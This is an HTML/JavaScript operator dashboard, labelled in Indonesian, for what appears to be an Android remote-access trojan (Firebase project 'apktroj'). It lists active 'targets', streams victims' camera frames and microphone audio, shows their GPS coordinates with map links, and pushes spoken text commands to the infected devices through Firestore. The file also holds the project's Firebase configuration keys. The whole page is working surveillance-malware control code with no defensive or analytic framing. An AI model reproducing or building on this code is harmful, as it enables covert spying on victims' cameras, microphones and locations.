<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R COMMAND CENTER V1.5</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body class="p-4">
    <div class="max-w-6xl mx-auto">
        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
            <div>
                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER</h1>
                <p id="auth-info" class="text-xs text-green-400">Connecting...</p>
            </div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
            <!-- Target List -->
            <div class="lg:col-span-1 border-r border-green-900 pr-4">
                <h2 class="text-lg font-bold mb-4">TARGET AKTIF</h2>
                <div id="victim-list" class="space-y-2 text-xs">Menunggu koneksi...</div>
            </div>

            <!-- Feed -->
            <div class="lg:col-span-3">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <!-- Stream -->
                    <div class="glitch-border p-4 bg-black">
                        <div class="flex justify-between items-center mb-2">
                            <span class="text-xs text-red-500 font-bold uppercase">Live Stream</span>
                            <span class="live-indicator" id="live-status">● IDLE</span>
                        </div>
                        <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden">
                            <img id="stream-img" src="" class="hidden w-full h-full object-contain">
                            <span id="placeholder" class="text-gray-700">No Signal...</span>
                        </div>
                        <!-- Audio Player -->
                        <audio id="target-audio" autoplay class="hidden"></audio>
                        
                        <div class="mt-4 p-2 bg-gray-900 border border-green-900 rounded">
                            <p class="text-[10px] text-green-500 font-bold uppercase">Intel Lokasi:</p>
                            <p class="text-xs text-white" id="lat-long">0.0, 0.0</p>
                            <a id="map-link" href="#" target="_blank" class="text-[10px] text-blue-400 underline hidden">G-MAPS</a>
                        </div>
                    </div>

                    <!-- Command -->
                    <div class="glitch-border p-4 bg-black flex flex-col">
                        <h3 class="text-blue-500 font-bold mb-2 uppercase text-sm">Interkom Suara</h3>
                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2" placeholder="Ketik pesan untuk dibacakan di target..."></textarea>
                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-3 hover:bg-blue-700 uppercase text-xs">Kirim Suara</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";
        let lastAudioTimestamp = 0;

        onAuthStateChanged(auth, async (user) => {
            if (!user) await signInAnonymously(auth);
            else {
                document.getElementById('auth-info').innerText = "OPERATOR ACTIVE: " + user.uid;
                initMonitor();
            }
        });

        function initMonitor() {
            const streamCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
            onSnapshot(streamCol, (snap) => {
                const list = document.getElementById('victim-list');
                if(!snap.empty) list.innerHTML = '';
                
                snap.forEach(docSnap => {
                    const data = docSnap.data();
                    const img = document.getElementById('stream-img');
                    const audioEl = document.getElementById('target-audio');
                    
                    // Update UI
                    const v = document.createElement('div');
                    v.className = "p-2 border border-green-900 bg-green-900 bg-opacity-10 mb-1";
                    v.innerText = `ID: ${data.uid?.substring(0,8)} [ONLINE]`;
                    list.appendChild(v);

                    // Update Image
                    if (data.frame) {
                        img.src = data.frame;
                        img.classList.remove('hidden');
                        document.getElementById('placeholder').classList.add('hidden');
                        document.getElementById('live-status').innerText = "● STREAMING";
                    }

                    // Play Audio if new
                    if (data.audio && data.timestamp > lastAudioTimestamp) {
                        audioEl.src = data.audio;
                        audioEl.play().catch(e => console.log("User must interact first to play audio"));
                        lastAudioTimestamp = data.timestamp;
                    }

                    if (data.location) {
                        document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
                        const mLink = document.getElementById('map-link');
                        mLink.href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
                        mLink.classList.remove('hidden');
                    }
                });
            });
        }

        document.getElementById('send-voice').onclick = async () => {
            const txt = document.getElementById('voice-msg').value;
            if(!txt) return;
            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
                text: txt,
                timestamp: Date.now()
            });
            document.getElementById('voice-msg').value = "";
        };
    </script>
</body>
</html>
